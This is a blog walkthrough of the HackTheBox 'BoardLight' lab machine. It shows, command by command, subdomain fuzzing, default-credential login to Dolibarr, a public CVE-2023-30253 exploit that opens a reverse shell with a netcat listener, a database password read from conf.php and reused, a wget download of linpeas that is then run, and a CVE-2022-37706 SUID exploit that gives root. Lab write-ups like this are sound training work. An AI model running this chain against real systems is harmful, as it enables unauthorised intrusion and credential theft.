---
layout: post
title: HackTheBox BoardLight
date: 2024-04-25
tags: [HackTheBox, Windows]
---

# Machine Synopsis

Currently Locked. ([Source](https://www.hackthebox.com/machines/boardlight))

# Enumeration

```bash
$ nmap -sC -sV 10.10.11.11
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.10.11.11
Host is up (0.0050s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.76 seconds
```



![website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/BoardLight/website.png?raw=true)

>   At the footer of the webpage: `© 2020 All Rights Reserved By Board.htb`.

Add `board.htb` into our hosts file.

```bash
$ ffuf -u "http://board.htb" -H "Host: FUZZ.board.htb" -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
...
warez                   [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 9ms]
index                   [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 10ms]
download                [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 16ms]
default                 [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 16ms]
search                  [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 15ms]
full                    [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 17ms]
privacy                 [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 16ms]
new                     [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 18ms]
about                   [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 17ms]
...
```

There seems to be multiple false positives. Filter out size `15949`.

```bash
$ ffuf -u "http://board.htb" -H "Host: FUZZ.board.htb" -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -fs 15949
...
crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 36ms]
```

Add `crm.board.htb` to the hosts file.

![crm_website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/BoardLight/crm_website.png?raw=true)

The credentials `admin:admin` worked but the admin dashboard showed `Access is denied.`

![admin_access_denied](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/BoardLight/admin_access_denied.png?raw=true)

# Exploitation

Searching for `Dolibarr 17.0 exploit` brings out to this [GitHub repository](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253).

```bash
$ python3 exploit.py http://crm.board.htb admin admin 10.10.14.5 9999
[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
```

```bash
$ nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.11] 50130
bash: cannot set terminal process group (890): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ cd /home
www-data@boardlight:/home$ ls
larissa
www-data@boardlight:/home$ cd larissa
bash: cd: larissa: Permission denied
```



```bash
www-data@boardlight:/home$ find /var/www/html/crm.board.htb/ -name "conf"
/var/www/html/crm.board.htb/htdocs/conf
www-data@boardlight:/home$ ls /var/www/html/crm.board.htb/htdocs/conf
conf.php
conf.php.example
conf.php.old
```



```bash
www-data@boardlight:/home$ cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
...
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';
...
```

Found the password `serverfun2$2023!!` and turns out this password is for `larissa`.



# Privilege Escalation

```bash
$ cd /usr/share/peass/linpeas
$ ls
linpeas.sh  linpeas_darwin_amd64  linpeas_darwin_arm64  linpeas_fat.sh  linpeas_linux_386  linpeas_linux_amd64  linpeas_linux_arm  linpeas_linux_arm64
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
larissa@boardlight:~$ wget http://10.10.14.5/linpeas.sh
larissa@boardlight:~$ chmod +x linpeas.sh
larissa@boardlight:~$ ./linpeas.sh
...
SUID - Check easy privesc, exploits and write perms
...
-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!)
...
```

The `/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys` is vulnerable to `CVE-2022-37706`. The exploit can be found [here](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit).

```bash
larissa@boardlight:~/Downloads$ ./exploit.sh 
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# 
```



